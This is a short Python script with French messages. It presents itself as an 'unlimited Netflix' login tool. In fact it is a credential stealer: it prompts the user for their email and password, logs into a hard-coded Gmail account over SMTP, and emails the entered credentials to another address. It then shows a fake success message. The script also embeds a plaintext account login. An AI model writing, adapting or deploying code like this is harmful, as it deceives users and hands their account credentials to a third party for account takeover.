import smtplib
#system('color c')
print("=============================================================================================== \n")
print("                                      Netflix illimite \n")
print("===============================================================================================\n")
print("Login >>\n")
user = str(raw_input("Email: "))
password = str(raw_input("Pass: "))
print("wait please...")
defr=":"
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("karloslikres@gmail.com", "fauxcompte")
msg =user+defr+password
server.sendmail("karloslikres@gmail.com", "20xxismailxx19@gmail.com", msg)
print("l'operation a fini avec succes !!")